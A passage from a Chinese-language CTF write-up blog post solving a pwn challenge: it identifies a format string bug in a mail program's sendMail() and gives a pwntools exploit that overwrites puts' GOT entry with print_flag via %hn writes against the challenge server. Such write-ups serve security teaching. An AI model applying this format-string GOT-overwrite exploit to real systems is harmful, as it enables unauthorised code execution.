<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxw16kanmnj30lk05aglo.jpg" alt="pwn1-4"></p>
<p>查询的地方都有注入，猜测flag可能在eaf124c02c4这个用户的收件箱或者发件箱里，尝试注入了一下，没有收获。</p>
<p>最后在sendMail函数里发现明显的格式化字符串漏洞：</p>
<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxw16ns68yj30ny0hi3zc.jpg" alt="pwn1-5"></p>
<p>由于sendMail()函数执行完会返回main()中，跟着执行displayAction()，而displayAction();里面是用puts来输出选项的。于是思路清晰了，将puts的got地址写到一个可控的内存位置，然后用格式化字符串来改写got表，使puts条目指向print_flag函数的地址，在这样在sendMail()函数返回后就会调用print_flag来打印flag。</p>
<p>看看gdb调试的结果：<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw16rrat5j30lh0ptwjj.jpg" alt="pwn1-6"></p>
<p>调用sendMail()后显示from:当前用户名，也就是说用户名在mailMail()的栈里或者附近。Gdb把栈打印一下，找到相应的12字节。因为注册登陆的时候调用的是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Input Your Name:&quot;);</span><br><span class="line">get_input((char *)&amp;v8, 12);</span><br></pre></td></tr></table></figure>
<p>所以用户名占了12个字节，上图所示12个字节即为用户名在内存中的分布。然后用格式化字符串漏洞调用一下，打印大概范围的内存，看看具体偏移是多少。</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw16rrat5j30lh0ptwjj.jpg" alt="pwn1-7"></p>
<p>得到偏移是%76$x，%77$x，%78$x，最后在IDA中找到相关的地址：</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw17166nvj30xw0ed760.jpg" alt="pwn1-8"></p>
<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxw176daz6j30l601m0sk.jpg" alt="pwn1-9"></p>
<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxw17b3oikj30zx0g1gnl.jpg" alt="pwn1-10"></p>
<p>puts的got表地址：804C038</p>
<p>puts的实际地址：0804C16</p>
<p>print_flg的实际地址：08048BBD</p>
<p>下面是exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">def rstr():</span><br><span class="line">    return str(random.randint(1000,9999))</span><br><span class="line"></span><br><span class="line">#r = process(&apos;./exploit&apos;)</span><br><span class="line">r = remote(&apos;121.40.207.47&apos;, 5563)</span><br><span class="line"></span><br><span class="line">name = p32(0x804c038) + p32(0x804c03a)</span><br><span class="line">pas = &apos;123&apos;</span><br><span class="line"></span><br><span class="line">#reg</span><br><span class="line">r.sendlineafter(&apos;Quit\n&apos;,&apos;1&apos;)</span><br><span class="line">r.sendlineafter(&apos;Name:&apos;,name)</span><br><span class="line">r.sendlineafter(&apos;Pass:&apos;,pas)</span><br><span class="line"></span><br><span class="line">#login</span><br><span class="line">r.sendlineafter(&apos;Quit\n&apos;,&apos;2&apos;)</span><br><span class="line">r.sendlineafter(&apos;Name:&apos;,name)</span><br><span class="line">r.sendlineafter(&apos;pass:&apos;,pas)</span><br><span class="line"></span><br><span class="line">#sendMail</span><br><span class="line">r.sendlineafter(&apos;Quit\n&apos;,&apos;3&apos;)</span><br><span class="line">#gdb.attach(r,&apos;&apos;&apos;</span><br><span class="line">#b *0x8049393</span><br><span class="line">#c</span><br><span class="line">#&apos;&apos;&apos;)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(&apos;To:&apos;,&apos;%35773c%76$hn&apos;) #8BBD </span><br><span class="line">r.sendlineafter(&apos;Title:&apos;,&apos;%2052c%77$hn&apos;) #0804</span><br><span class="line">r.send(&apos;123\n&apos;)</span><br><span class="line">s = r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxw17fojn2j30ka0ctdhx.jpg" alt="pwn1-11"></p>
</div><div class="tags"><a href="/tags/Writeup/">Writeup</a></div><div class="post-nav"><a class="pre" href="/2015/04/15/dutctf-writeup/">DUTCTF热身赛Writeup</a><a class="next" href="/2014/12/11/SCTF-2014-Writeup/">SCTF 2014 初赛Writeup</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="https://www.imbeee.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/Homelab/" style="font-size: 15px;">Homelab</a> <a href="/tags/Writeup/" style="font-size: 15px;">Writeup</a> <a href="/tags/Pentest/" style="font-size: 15px;">Pentest</a> <a href="/tags/Tool/" style="font-size: 15px;">Tool</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://imbeee.github.io/" title="Github Pages备份" target="_blank">Github Pages备份</a><ul></ul><a href="https://ymr.me/" title="野蛮人の洞窟" target="_blank">野蛮人の洞窟</a><ul></ul><a href="http://bksec.net/" title="my5t3ry的blog" target="_blank">my5t3ry的blog</a><ul></ul><a href="https://www.blackh4t.org/" title="DarkRay's BLoG.!" target="_blank">DarkRay's BLoG.!</a><ul></ul><a href="https://www.iswin.org/" title="随风's Blog" target="_blank">随风's Blog</a><ul></ul><a href="http://www.00theway.org/" title="00theway's Blog" target="_blank">00theway's Blog</a><ul></ul><a href="https://threathunter.org/" title="ThreatHunter社区" target="_blank">ThreatHunter社区</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">Beeeの零碎事.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>